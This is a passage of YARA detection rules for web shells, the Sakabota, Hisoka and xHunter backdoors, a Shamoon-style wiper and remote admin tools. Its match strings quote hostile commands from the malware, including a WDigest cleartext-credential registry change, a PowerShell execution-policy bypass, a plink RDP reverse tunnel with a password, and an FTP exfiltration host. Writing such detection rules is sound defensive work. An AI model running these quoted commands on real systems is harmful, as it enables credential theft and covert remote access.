      $s14 = "HttpContext.Current.Server.ScriptTimeout = 600;" fullword ascii
      $s15 = "<%@ Import Namespace=\"System.Web.SessionState\" %>" fullword ascii
      $s16 = "socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, 2000); //NOTE:20 second timeout" fullword ascii
      $s17 = "Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);" fullword ascii
      $s18 = "HttpContext.Current.Response.Write(\"[Server] Unable to set socket to non blocking mode\");" fullword ascii
      $s19 = "Response.Write(\"[Server] All good to go, ensure the listener is working ;-)\\n[FILE]:[WIN]\");" fullword ascii
      $s20 = "Session[\"port\"] = Convert.ToInt32(Request.QueryString[\"port\"]);" fullword ascii
   condition:
      ( uint16(0) == 0x253c and
        filesize < 20KB and
        ( 2 of ($x*) and 6 of ($s*) )
      ) or ( all of them )
}
rule WC_cmdsql {
   meta:
      description = "cmdsql.aspx"
      date = "2020-02-07"
      hash1 = "52aad8f2677b31e7e811e3ce8ae0b34e9ba084b51a690a8876d28092328964a9"
   strings:
      $x1 = "<asp:TextBox id=\"xpath\" width=\"350\" runat=\"server\">c:\\windows\\system32\\cmd.exe</asp:TextBox><br><br>" fullword ascii
      $x2 = "<!-- Web shell - command execution, web.config parsing, and SQL query execution -->" fullword ascii
      $x3 = "<!-- SQL Query Execution - Execute arbitrary SQL queries (MSSQL only) based on extracted connection strings -->" fullword ascii
      $x4 = "<!-- Command execution - Run arbitrary Windows commands -->" fullword ascii
      $x5 = "<!-- Based on old cmd.aspx from fuzzdb - http://code.google.com/p/fuzzdb/ -->" fullword ascii
      $x6 = "<!-- Web.Config Parser - Extract db connection strings from web.configs (based on chosen root dir) -->" fullword ascii
      $s7 = "<asp:TextBox id=\"webpath\" width=\"350\" runat=\"server\" Text=\"c:\\inetpub\">C:\\inetpub</asp:TextBox>" fullword ascii
      $s8 = "<asp:TextBox id=\"xcmd\" width=\"350\" runat=\"server\" Text=\"/c net user\">/c net user</asp:TextBox><br>" fullword ascii
      $s9 = "<asp:TextBox id=\"query\" runat=\"server\" Text=\"select @@version;\" width=\"350\">select @@version;</asp:TextBox> " fullword ascii
      $s10 = "<!-- Thanks to Scott (nullbind) for help and fancy stylesheets -->" fullword ascii
      $s11 = "<asp:Button id=\"Button\" OnCommand=\"RunCmd\" CommandArgument=\"cmd\" runat=\"server\" Width=\"100px\" Text=\"RUN\"></asp:Butto" ascii
      $s12 = "<strong>EXECUTE SQL QUERIES</strong></a><Br>" fullword ascii
      $s13 = "<strong>PARSE WEB.CONFIGS FOR CONNECTION STRINGS</strong></a><Br>" fullword ascii
      $s14 = "<asp:Button id=\"SqlQuery\" OnCommand=\"RunCmd\" CommandArgument=\"sqlquery\" runat=\"server\" Width=\"100px\" Text=\"RUN\"></as" ascii
      $s15 = "<asp:Button id=\"WebConfig\" OnCommand=\"RunCmd\" CommandArgument=\"webconf\" runat=\"server\" Width=\"100px\" Text=\"RUN\"></as" ascii
      $s16 = "<strong>ENTER OS COMMANDS</strong></a><Br>" fullword ascii
      $s17 = "<font color=\"555555\"><asp:Label id=\"history\" runat=\"server\"></asp:Label></font>" fullword ascii
      $s18 = "background-image:url('images/post_top.jpg');" fullword ascii
      $s19 = "background-image:url('images/post_middle.jpg');" fullword ascii
      $s20 = "<!-- Antti - NetSPI - 2013 -->" fullword ascii
   condition:
      ( uint16(0) == 0x213c and
        filesize < 60KB and
        ( 4 of ($x*) and 6 of ($s*) )
      ) or ( all of them )
}
rule svhost_svhost {
   meta:
      date = "2020-02-11"
      hash1 = "19c91f2836215a8d9962206d9fa4e2f0ba15445ff856049a8e64240c81f8f87c"
   strings:
      $x1 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe" fullword wide
      $x2 = "C:\\windows\\temp\\svhost.exe" fullword wide
      $x3 = "C:\\\\windows\\\\temp\\sysBin.sys" fullword wide
      $x4 = "C:\\windows\\svhost.exe" fullword wide
      $x5 = "\\C$\\windows\\temp\\svhost.exe" fullword wide
      $s6 = "C:\\windows\\temp.txt" fullword wide
      $s7 = "C:\\users\\" fullword wide
      $s8 = "C:\\Documents and Settings\\" fullword wide
      $s9 = "C:\\windows\\system32\\" fullword wide
      $s10 = "Gazaneh.exe" fullword wide
      $s11 = "Nishador.exe" fullword wide
      $s12 = " /c dsquery computer -limit 0" fullword wide
      $s13 = "ProcessProtection" fullword ascii
      $s14 = "From Iran with love. - Shamoon 4" fullword ascii
      $s15 = "runCommand" fullword ascii
      $s16 = " process call create " fullword wide
      $s17 = "C:\\Recovery\\" fullword wide
      $s18 = "C:\\inetpub\\" fullword wide
      $s19 = "\\C$\\windows\\temp\\" fullword wide
      $s20 = "C:\\ProgramData\\" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 70KB and
        ( 1 of ($x*) and 4 of ($s*) )
      ) or ( all of them )
}
rule PsExec64 {
   meta:
      description = "PsExec64.exe @ Remote Administration Tool: Consult your Administrators"
      date = "2020-02-07"
      hash1 = "ad6b98c01ee849874e4b4502c3d7853196f6044240d3271e4ab3fc6e3c08e9a4"
   strings:
      $s1 = "* use the software for commercial software hosting services." fullword wide
      $s2 = "These license terms are an agreement between Sysinternals(a wholly owned subsidiary of Microsoft Corporation) and you.Please rea" wide
      $s3 = "The software is subject to United States export laws and regulations.You must comply with all domestic and international export " wide
      $s4 = "sNtdll.dll" fullword wide
      $s5 = "bec, Canada, certaines des clauses dans ce contrat sont fournies ci - dessous en fran" fullword wide
      $s6 = "* anything related to the software, services, content(including code) on third party Internet sites, or third party programs; an" wide
      $s7 = "\\caps\\fs20 6.\\tab\\fs19 Export Restrictions\\caps0 .\\b0   The software is subject to United States export laws and regulatio" ascii
      $s8 = "ril.Sysinternals n'accorde aucune autre garantie expresse. Vous pouvez b" fullword wide
      $s9 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Server\\ServerLevels" fullword wide
      $s10 = "clamations au titre de violation de contrat ou de garantie, ou au titre de responsabilit" fullword wide
      $s11 = "-Nano Server does not support -i or -x option." fullword wide
      $s12 = "\\pard\\brdrb\\brdrs\\brdrw10\\brsp20 \\sb120\\sa120\\b\\f0\\fs24 SYSINTERNALS SOFTWARE LICENSE TERMS\\fs28\\par" fullword ascii
      $s13 = "The software is licensed \"as - is.\" You bear the risk of using it.Sysinternals gives no express warranties, guarantees or cond" wide
      $s14 = "process state" fullword wide
      $s15 = "*Internet - based services," fullword wide
      $s16 = "User key container with default name does not exist. Try create one." fullword wide
      $s17 = "for this software, unless other terms accompany those items.If so, those terms apply." fullword wide
      $s18 = "sent contrat ne modifie pas les droits que vous conf" fullword wide
      $s19 = "-accepteula This flag suppresses the display of the license dialog." fullword ascii
      $s20 = "Software\\Microsoft\\windows nt\\currentversion" fullword wide
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 1000KB and
        pe.imphash() == "159d56d406180a332fbc99290f30700e" and
        ( 14 of ($s*) )
      ) or ( all of them )
}
rule AeroAdmin {
   meta:
      description = "AeroAdmin.exe @ Remote Administration Tool: Consult your Administrators"
      date = "2020-02-07"
      hash1 = "c5d40eeb1ee8507b416af21a0e021f7840dfcbb7eefdd6b708ca4d05d1497bd2"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\" xmlns:asmv3=\"urn:schemas-microsoft-com:asm.v3\"><d" ascii
      $x2 = "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.25) Gecko/20111212 Firefox/3.6.25 " fullword ascii
      $s3 = "z:\\hg_clone\\source\\aeroadmin\\rsaencryptorvalidator.cpp" fullword ascii
      $s4 = "z:\\hg_clone\\source\\aeroadmin\\messageprocessor.cpp" fullword ascii
      $s5 = "z:\\hg_clone\\source\\aeroadmin\\rsaencryptor.cpp" fullword ascii
      $s6 = "z:\\hg_clone\\source\\aeroadmin\\aesencryptor.cpp" fullword ascii
      $s7 = "UPDATER: error executing - rolling back update state" fullword ascii
      $s8 = "z:\\hg_clone\\source\\aeroadmin\\rsadecryptor.cpp" fullword ascii
      $s9 = "z:\\hg_clone\\source\\aeroadmin\\sessionkeyvalidator.cpp" fullword ascii
      $s10 = "auth13.aeroadmin.com" fullword ascii
      $s11 = "auth17.aeroadmin.com" fullword ascii
      $s12 = "auth12.aeroadmin.com" fullword ascii
      $s13 = "auth15.aeroadmin.com" fullword ascii
      $s14 = "auth11.aeroadmin.com" fullword ascii
      $s15 = "auth19.aeroadmin.com" fullword ascii
      $s16 = "auth16.aeroadmin.com" fullword ascii
      $s17 = "auth18.aeroadmin.com" fullword ascii
      $s18 = "auth20.aeroadmin.com" fullword ascii
      $s19 = "auth14.aeroadmin.com" fullword ascii
      $s20 = "auth10.aeroadmin.com" fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 7000KB and
        pe.imphash() == "cdf06975fbfef3ba8db53eb7af0ea5f3" and
        ( 1 of ($x*) and 12 of ($s*) )
      ) or ( all of them )
}
rule WC_any {
   meta:
      description = "any.exe @ Remote Administration Tool: Consult your Administrators"  
      date = "2020-02-07"
      hash1 = "d928708b944906e0a97f6a375eb9d85bc00de5cc217d59a2b60556a3a985df1e"
   strings:
      $x1 = "C:\\Buildbot\\ad-windows-32\\build\\release\\app-32\\win_loader\\AnyDesk.pdb" fullword ascii
      $x2 = "<assemblyIdentity version=\"5.2.2.0\" processorArchitecture=\"x86\" name=\"philandro.AnyDesk.AnyDesk\" type=\"win32\" />" fullword ascii
      $s3 = "<assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" pu" ascii
      $s4 = "4http://crl3.digicert.com/DigiCertAssuredIDRootCA.crl0O" fullword ascii
      $s5 = "Bhttp://cacerts.digicert.com/DigiCertSHA2AssuredIDCodeSigningCA.crt0" fullword ascii
      $s6 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii
      $s7 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii
      $s8 = "/http://crl4.digicert.com/sha2-assured-cs-g1.crl0L" fullword ascii
      $s9 = "/http://crl3.digicert.com/sha2-assured-cs-g1.crl05" fullword ascii
      $s10 = "<description>AnyDesk screen sharing and remote control software.</description>" fullword ascii
      $s11 = "http://ocsp.digicert.com0N" fullword ascii
      $s12 = "1f28ebbedff81d5cec56f093b8dc76a80f5ae239" fullword ascii
      $s13 = "eae322e3e525eb60ab48d1de76cc23cc" fullword ascii
      $s14 = "2q:\\6bi" fullword ascii
      $s15 = "+Qt:\\ek" fullword ascii
      $s16 = "H|nGet" fullword ascii
      $s17 = "5.2.2.0" fullword wide
      $s18 = "+* 4Ag\"P" fullword ascii
      $s19 = "4%Tlf+ " fullword ascii
      $s20 = "eB57- " fullword ascii
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 9000KB and
        ( 1 of ($x*) and 8 of ($s*) )
      ) or ( all of them )
}

rule FE_HUNT_APT_DIEZEN
{                   
strings:
                     $string1pdb = "Z:\\Tools\\Sakabota_Tools\\Utility\\Micosoft_Visual_Studio_2010_Experss\\PRJT\\Sakabota\\Diezen\\Diezen\\obj\\x86\\Release\\taskhost.pdb"
                     $string2pdb = "\\Diezen\\"
                     $string4 = "-doer [Command]" wide
                     $string5 = "--> individual CMD Process " wide
                     $string6 = "-scheduler [A][S][D][Q][U username]" wide
                     $string8 = "-sleep [Number]" wide
                     $string9 = "--> Put Diezen to sleep Day " wide
                     $string10 = "-upgrade [PATH{{exe}}>Command]" wide
                     $string11 = "--> URL payload ,Command to run " wide
                     $string13 = "--> Chek diezen status" wide
                     $string14 = "-limit [option]" wide
                     $string15 = "--> limiting diezen connetcion, option=WUA,None" wide
                     $string16 = "-live [count" wide
                     $string17 = "--> live feed screen" wide
                     $string18 = "-send [path>des:\\Folder\\]" wide
                     $string19 = "--> Send file to diezen  " wide
                     $string20 = "--> Rexcuted diezen    " wide
                     $string23 = "-Send improvment" wide
                    $string24 = "-scheduler imporovment" wide
                     $string25 = "-adding (A) Mark For Acive Users" wide
                     $string26 = "-adding Feed Only When user is Active " wide
                     $string27 = "-Compatible with Sakabota v2.0" wide
                     $string29 = " Diezen Version is Upgraded ..." wide
                     $string30 = "Diezen_Sleep"
                     $string31 = "Diezen_Sleep_NUM"
                     $string32 = "Diezen Sleeped " wide
                     $string33 = "* diezen mode : backdoor mode" wide
                     $string34 = "* diezen mode : User mode" wide
                     $string35 = "Diezen status is " wide
                     $string36 = "Restarting Diezen ..... " wide
                     $string37 = "ID : Diezen excuted Doer -> " wide
                     $string38 = "Diezen Version is Upgraded ..." wide
                     $string39 = "Can not modife Task Scheduler!!!" wide
                    
                     $asciiart1 = "_v{0}___  .__"
                     $asciiart2 = "\\______ \\ |__| ____ ________ ____   ____"
                     $asciiart3 = "    |    |  \\|  |/ __ \\\\___   // __ \\ /    \\"
                     $asciiart4 = "    |    `   \\  \\  ___/ /    /\\  ___/|   |  \\"
                     $asciiart5 = "/_______  /__|\\___  >_____ \\\\___  >___|  /"
                     $asciiart6 = "        \\/        \\/      \\/    \\/     \\/"
condition:
          ((uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and filesize < 3MB) and
          (2 of ($string*) or all of ($asciiart*))
}

rule FE_HUNT_APT_SAKABOTA
{                   
strings:
        $string1 = "Blade for not to killing"
        $string2 = "Sakabota.Properties.Resources"
condition:
        ((uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and filesize < 3MB) and (any of them)
}

rule FE_HUNT_APT_SAKABOTA_generic
{                   
strings:
          $string1pdb = "Sakabota_Tools"
          $string2pdb = "Micosoft_Visual_Studio_2010_Experss"
          $string3pdb = "PRJT\\Sakabota"
          $string4pdb = "\\Sakabota\\"
          $string5 = " Chenged" wide
          $string6 = " * Locaiton : " wide
          $string7 = " * StartUP Writable : [Public -> " wide
          $string8 = "-harakiri" wide
          $string9 = "-change [Host:Port]" wide
          $string10 = "--> Chenge Server" wide
          $string11 = "-harakiri                  " wide
          $string12 = "--> Self Distrucet " wide
          $string13 = "-change [Host:Port]" wide
          $string14 = "--> Chenge Server" wide
          $string15 = "--> SYSTEM,Delete,Query,allUser" wide
          $string16 = "-harakiri" wide
          $string17 = "--> Self Distrucet" wide
          $string18 = "-> i am here boss !" wide
          $string19 = "We will wait for you boss !! " wide
          $string20 = "successful Runed !!" ascii wide
          $string61 = " > Thumb.dll\" & timeout /t 3 /nobreak & exit" wide  
          $string76 = " successfully !!" wide
condition:
          ((uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and filesize < 3MB) and
          any of them
}

rule FE_HUNT_HISOKA
{                   
strings:
                     $string1 = "Last Hideing Scheduler  -->" wide
                     $string2 = "yyyy-MM-dd|#|HH:mm" wide
                     $string3 = "(?<=Changes{)-?." wide
                     $string4 = "---->Last Changing From" wide
                     $string5 = "Report Unbel to Inatiated !!!" wide
                     $string6 = "  Resting Buffer.." wide
                     $string7 = "EUDC\\313\\hisoka" wide
                     $string8 = "RDP_Machin" wide
                     $string9 = "Warnning : all scheduler reset !!" wide
                     $string11 = "Hisoka Frozed Until " wide
                     $string12 = "Expire Date Shifted" wide
                     $string13 = "{Hisoka}" wide
                     $string14 = " Hisoka DNS type Set To -> " wide
                     $string15 = "[+] Hisoka engine set to [" wide
                     $string16 = "{Hisoka}" wide
                     $string17 = " --> Scheduler  Deleted successfully!!!..." wide
                     $string18 = " --> Scheduler  Could not Deleted !!!..." wide
                     $string19 = " --> Scheduler Set To " wide
                     $string20 = " --> Scheduler Not Created..." wide
                     $string21 = " --> Network Tacktik updateing ...." wide
                     $string22 = " --> Profile Cleared...." wide
                     $string23 = " Hisoka AI until Now --> " wide
                     $string24 = " * Strategy : " wide
                     $string25 = " * Most Visit : " wide
                     $string26 = " Hisoka until Now --> " wide
                     $string27 = " * Core : [+]Engine(" wide
                     $string28 = ") [+]Speed {P" wide
                     $string29 = "s} [+]Type(" wide
                     $string30 = ")  [+]Server(" wide
                     $string31 = " * Hisoka mode : Backdoor mode" wide
                     $string32 = " * Hisoka Mode : User mode" wide
                     $string33 = " * Task Scheduler : Flase " wide
                     $string36 = " * Hisoka Version : v" wide
                     $string37 = " Restarting Hisoka ..... " wide
                     $string38 = "ID : Hisoka excuted Doer -> " wide
                     $string39 = "ID : Error: input maybe wrong...-> " wide
                     $string40 = "ID : Hisoka expire date set to -> " wide
                     $string41 = "ID : this future require TXT Mode !!  Please switch to TXT Mode ..." wide
                     $string42 = "ID :Hisoka " wide
                     $string43 = "] successfully ..." wide
                     $string44 = "] not Exists ..." wide
                     $string45 = "[!] Hisoka " wide
                     $string46 = "ID : Growing on ->" wide
                     $string47 = "ID : Growing Unavailable !!  no Trusted IP." wide
                     $string48 = " !! Warnning : all scheduler reset !!" wide
                     $string49 = "Warnning : all scheduler Remained on --> " wide
                     $string50 = " Hisoka v" wide
                     $string51 = " Hisoka Upgrade ERROR [File Not Found] !!" wide
                     $string52 = "TIP : Current directory changed successfully to -> " wide
                     $string53 = "ERROR : not such directory, Current CD is  -> " wide
                     $string57 = "-core [-engine DNS,HTTP] [-speed [P1][R1]] [-type A,TXT]-->setting" wide
                     $string58 = "-doer [[-W,-P] Host;U;P;WD];code --> individual CMD, WD Working Dir" wide
                     $string59 = "--> Put Hisoka to sleep day minute hour " wide
                     $string60 = "-upgrade [p:\\ath.exp][-D][-R]" wide
                     $string61 = "--> Payload ,-Reveres loc, -D del sched" wide
                     $string62 = "-grow [-A dir_Path][node user;pass;dir_Path]" wide
                     $string63 = "--> copy & run,-Auto " wide
                     $string64 = "--> send to hisoka file " wide
                     $string65 = "--> get file from hisoka via HTTP" wide
                     $string66 = "-status [AI][-C][-T][-U] --> -U update status, -Clear,change -Tactic " wide
                     $string67 = "--> Rexcuted Hisok" wide
                     $string68 = "--> expire in day " wide
                     $string71 = "*   ****** Ravolation Hisoka ********      *" wide
                     $string72 = "*   - General & AI Improvment              *" wide
                     $string73 = "*   - DNS A improvment & HTTP Engine       *" wide
                     $string74 = "*   - add HTTP Send                        *" wide
                     $string75 = "*   - Compatible with Sakabota v3.2        *" wide
                     $string76 = "Golden_Random" wide
                     $string77 = "Num must be less then half of user name [" wide
                     $string78 = "in these case between 1 <-> " wide
                     $string79 = "Hisoka Run On -> " wide
                     $string80 = " in background.." wide
                     $string81 = "--> Run in Background" wide
                     $string82 = "--> Run With Alluser Schedulers" wide
                     $string83 = "--> Run With user Schedulers" wide
                     $string84 = "--> Run as Sys [need Privilge]" wide
                     $string85 = "--> Run and set lives dayes" wide
                     $string86 = "--> Golden Random Num [ID]" wide
                     $string87 = "--> clear Profiled and run" wide
                     $string88 = "--> Change Tactick and run" wide
                     $string89 = "[+] Console Help : " wide
                     $string90 = "[+] Server Help: " wide
                     $string91 = "Not Order : " wide
                     $string92 = "Zzz --> " wide
                     $string93 = " Change Tactic Successfully ..... " wide
                     $string94 = "Hisoka Path : " wide
                     $string95 = " Hisoka Upgraded to...v" wide
                     $string96 = "[+] Hisoka Completed -> " wide
                     $string97 = "Skiping ......" wide
                     $string98 = "hisoka." wide
                     $string99 = "Lookup_Global : " wide
                     $string100 = "File_Reciver : Output -> " wide
                     $string101 = "File_Reciver : " wide
                     $string102 = "22112edc-c204-4d3a-b85b-e84c7d4249c3" wide
                     $string103 = " Hisoka Speed Changed " wide
                     $string104 = "[+] Packet Size(" wide
                     $string105 = "[+] Response(1s <-> " wide
                     $string106 = "Sleeper ----> " wide
                     $string107 = "V : Domain -> [" wide
                     $string108 = "]  Machine -> [" wide
                     $string109 = "]  User -> [" wide
                     $string110 = "]  OS -> [" wide
                     $string111 = "I Love you Analysers" wide
                     $string113 = "[+] Task_Scheduler Cleaned !!!" wide
                     $string114 = "[+] Task_Scheduler Not Cleaned !!!" wide
                     $string115 = "[+] Registry Cleaned !!!" wide
                     $string116 = "[+] Registry Not Cleaned !!!" wide
                     $string117 = "      {We will wait for you boss !!}" wide
                     $string118 = "\\Hisoka.dll" wide
                     $string119 = "++++++++++++++++++Hisoka_v" wide
                     $string120 = "SMB issue !!!" wide
                     $string121 = "Hisoka Copeid !! and Fired Up with 4 expire day !!!!" wide
                     $string122 = "[+] iN --> " wide
                     $string123 = "     [+] Avreage Time : " wide
                     $string124 = "[+] Computers : " wide
                     $string125 = "[+] Users : " wide
                     $string126 = "[+] Groups : " wide
                     $string127 = "[!] it's not join the Domain" wide
                     $string128 = "    * SMB & RDP [" wide
                     $string129 = "    * Netstat : " wide
                     $string130 = "    * RDP Sessions : " wide
                     $string131 = "    * IP Change : " wide
                     $string132 = "    * Remotes Apps : " wide
                     $string133 = "[*] AnyDesk --> " wide
                     $string134 = "[*] TeamViewer --> " wide
                     $string135 = "Last Update... ----> " wide
                     $string136pdb = "\\Hisoka\\"
                    
                     $mutex = "22112edc-c204-4d3a-b85b-e84c7d4249c3"
 
                     $asciiart1 = "_________ _______   _____   _______  __v{0}_  _______"      wide
                     $asciiart2 = "         _________ _______   _____   _        __v{0}_" wide
                     $asciiart3 = "|\\     /|\\__   __/(  ____ \\(  ___  )| \\    /\\(  ___  )" wide
                     $asciiart4 = "| )   ( |   ) (   | (    \\/| (   ) ||  \\  / /| (   ) |" wide
                     $asciiart5 = "| (___) |   | |   | (_____ | |   | ||  (_/ / | (___) |" wide
                     $asciiart6 = "|  ___  |   | |   (_____  )| |   | ||   _ (  |  ___  |" wide
                     $asciiart7 = "| (   ) |   | |         ) || |   | ||  ( \\ \\ | (   ) |" wide
                     $asciiart8 = "| )   ( |___) (___/\\____) || (___) ||  /  \\ \\| )   ( |" wide
                     $asciiart9 = "|/     \\|\\_______/\\_______)(_______)|_/    \\/|/     \\|" wide
 
condition:
          ((uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and filesize < 2MB) and
          (5 of ($string*) or 7 of ($asciiart*) or $mutex)
}

rule FE_HUNT_LINKHIDE
{                   
strings:
          $string1 = "\\UsbSprd\\"
          $string2 = "\\UsbSprd.pdb"
          $string3 = "d8d09bcd-2f24-4237-866e-4111c713f646"
          $string4 = "UsbSprd.Resources"
                    
condition:
          (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and filesize < 3MB and
          any of them
}

rule FE_HUNT_SAKABOTA_EYE
{                   
strings:
          $string1 = "Choise -> Log off Mode  ? :" wide
          $string2 = "Start Watching With LOG_OFF Mode..." wide
          $string3 = "Start Watching Without LOG_OFF Mode..." wide
         
          $pdb1 = "\\EYE\\EYE\\"
          $pdb2 = "\\PRJT\\Sync\\"
 
condition:
          ((uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and filesize < 3MB) and
          (any of ($string*) or any of ($pdb*))
}

rule FE_HUNT_XHUNTER_Gon
{                   
strings:
          $string1 = "Cleard !!!!!" wide
          $string2 = "we be wait for you boss !!!" wide
          $string3 = "Reg_Profile Inatiated !!!" wide
          $string4 = "Reg Init...." wide
          $string5 = "[+] Remote Started ..........." wide
          $string6 = "xHunter ---> " wide
          $string7 = "i will give you feed back boss !" wide
          $string8 = "Personal Use is ON" wide
          $string9 = "Personal Use is OFF" wide
          $string10 = "Silent Mode is ON" wide
          $string11 = "Silent Mode is OFF" wide
          $string12 = "MIMIKATZ file (*.exe)|*.exe" wide
          $string13 = "d HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 & echo y |reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential" wide
          $string14 = "File Copeid !! -> \\\\" wide
          $string15 = "PSexec file (*.*)|*.*" wide
          $string16 = "[+] Shooting ..........." wide
          $string17 = "Perparing ..." wide
          $string18 = "IPs not correct !!!" wide
          $string19 = "File Issue !!!" wide
          $string20 = "Not Such hostname !!! maybe check your DNS Server" wide
          $string21 = "Get-EventLog  Security 4624  |   Select-Object  @{Name=\" \";Expression={ $_.ReplacementStrings[5,18]}}" wide
          $string22 = " & powershell -exec bypass -file P.ps1 > User_PC's.txt" wide
          $string23 = "[+] Brute Force SMB Negative init ......" wide
          $string24 = "[+] Brute Force SMB Passive init ......" wide
          $string25 = "Text file (*.txt)|*.txt" wide
          $string26 = "[+] Scan inita ......" wide
          $string27 = "TXT file (*.*)|*.*" wide
          $string28 = "Starting echo server..." wide
          $string29 = " Port is alreaday open .." wide
          $string30 = "server started successfully !" wide
          $string31 = "echo server Stoped..." wide
          $string32 = "Gon_Pic" wide
          $string33 = " is Proccessing ..." wide
          $string34 = " is Completed ..." wide
          $string35 = " is Deleted ..." wide
          $string42 = "-Up[-l Path.txt] FOLDER_OR_FILE -C Host;User;Pass [-KWF](kill when Finish) [-DEL](delete when item upload)" wide
          $string43 = "[+] is ftp upload 1_ex=-up my_folder_or_File -KWF -DEL -C server.com;admin;123 " wide
          $string44 = "2_ex=-up-l my_Path.txt -C server.com;admin;123" wide
          $string45 = "-Screen[-up][-s count,seconds] -C Host;User;Pass" wide
          $string46 = "] Print Screen -up is upload to ftp and delete the file. -s will repate and will upload -C Cerdential For Upload via FTP" wide
          $string47 = "-Remote [-P] [Host;user;pass;Wdir] [Code]" wide
          $string48 = "[+] wmic to host;user;-P is psexecmode ,pass and save it in Wdir\\Thumb.dll" wide
          $string49 = "-Download[-s] URL" wide
          $string50 = "[+] http://www.URL , is -s Https will download in same directory" wide
          $string51 = "-Scan[-v IP-To][-l Path.txt] [setp] [-A]" wide
          $string52 = "[+] Result will be in P.txt,-A is advanced scan but slower, step is number to bruteforce MAX 230 -> ex = -Scan-v 192.168.?.? 8" wide
          $string53 = "-Bruter Path.txt username;pass{?} [+][-]" wide
          $string54 = "[+] Result will be in N.txt , [+] Write netuse IP,[-] Write nont-netuse IP, Tip = Username & Password can be read from file" wide
          $string55 = "-Rev[-clean][-loop] [V_ip] [port_to_Exit] [server;port]" wide
          $string56 = "[+] RDP Revers on loop on every 10 min and with SYSTEM" wide
          $string57 = "-Globe[-v p,o-r,t,s] [server]" wide
          $string58 = "[+] Scan Global Port 123,443,80,81,23,21,22,20,110,25, v is Custom port " wide
          $string59 = "[+] self Distruct" wide
          $string60 = "Step is to much !!!! Must be between 2 to 230........." wide
          $string62 = "Plink stored in temp user !" wide
          $string63 = " & echo y | svphost " wide
          $string64 = ":3389 -l bor -pw 123321 -P " wide
          $string65 = "Schedule Created as SYSTEM for Every 10 Min!" wide
          $string66 = "svphost is started !" wide
          $string67 = "Plink is Fired up !" wide
          $string68 = "Start Advanced Scan..........." wide
          $string69 = "Tip = Result will be P.txt !!!" wide
          $string70 = "Ping 128x Complated !!!" wide
          $string71 = "Result will be N.txt !!!" wide
          $string72 = "Net use Complated !!!" wide
          $string73 = "] -> The command completed successfully." wide
          $string74 = " {Gon}" wide
          $string75 = " successfully have SMB !!" wide
          $string77 = "Screen shot store to " wide
          $string78 = " -Screen-Go " wide
          $string79 = "Screen is started <" wide
          $string80 = "> for every " wide
          $string81 = " Secound !" wide
          $string82 = " -Screen-up" wide
          $string83 = " Copied & Run" wide
          $string84 = " RPC denied" wide
          $string85 = " File not Exists" wide
          $string86 = " File Could not deleted" wide
          $string87 = "\\Shoot_Result.txt" wide
          $string88 = "**************Sakabota_v" wide
          $string89 = " Get & Cleand" wide
          $string90 = "ftp://www.pasta58[.]com" wide
          $string91 = " --> its Open" wide
          $string92 = " --> its Close" wide
          $string93 = "> Exsit" wide
          $string94 = " Responsed !" wide
          $string95 = "do u want to save Result?" wide
          $string96 = "Scan IP Completed !!" wide
          $string97 = "Scan Not Completed !!" wide
          $string98 = " Stoped" wide
          $string99 = "Mono8&^Ujm" wide
          $string100 = "EUDC\\313" wide fullword
          $string101 = "/C taskkill /f /im svphost.exe" wide
          $string102 = "svphost.exe killed" wide
          $string103 = "svphost.exe deleted" wide
 
          $asciiart1 = "  ___v{0}_" wide
          $asciiart2 = " /  _____/  ____   ____" wide
          $asciiart3 = "/   \\  ___ /  _ \\ /    \\" wide
          $asciiart4 = "\\    \\_\\  (  <_> )   |  \\" wide
          $asciiart5 = " \\______  /\\____/|___|  /" wide
          $asciiart6 = "        \\/            \\/" wide
 
condition:
          ((uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and filesize < 3MB) and
          (5 of ($string*) or all of ($asciiart*))
} 

rule assistant {
   meta:
      hash1 = "cf3a7d4285d65bf8688215407bce1b51d7c6b22497f09021f0fce31cbeb78986"
   strings:
      $x1 = "C:\\vbox\\branch\\w64-1.6\\out\\win.amd64\\release\\obj\\src\\VBox\\HostDrivers\\VBoxDrv\\VBoxDrv.pdb" fullword ascii
      $s2 = "C:\\vbox\\branch\\w64-1.6\\src\\VBox\\Runtime\\r0drv\\memobj-r0drv.cpp" fullword ascii
      $s3 = "VBoxDrv.sys" fullword ascii
      $s4 = "vboxdrv: Bad ioctl request header; cbIn=%#lx cbOut=%#lx fFlags=%#lx" fullword ascii
      $s5 = "SUP_IOCTL_COOKIE: Version mismatch. Requested: %#x  Min: %#x  Current: %#x" fullword ascii
      $s6 = "SUP_IOCTL_QUERY_FUNCS: Invalid input/output sizes. cbIn=%ld expected %ld. cbOut=%ld expected %ld." fullword ascii
      $s7 = "SUP_IOCTL_PAGE_ALLOC: Invalid input/output sizes. cbIn=%ld expected %ld. cbOut=%ld expected %ld." fullword ascii
      $s8 = "SUP_IOCTL_LOW_ALLOC: Invalid input/output sizes. cbIn=%ld expected %ld. cbOut=%ld expected %ld." fullword ascii
      $s9 = "SUP_IOCTL_LDR_LOAD: Invalid input/output sizes. cbIn=%ld expected %ld. cbOut=%ld expected %ld." fullword ascii
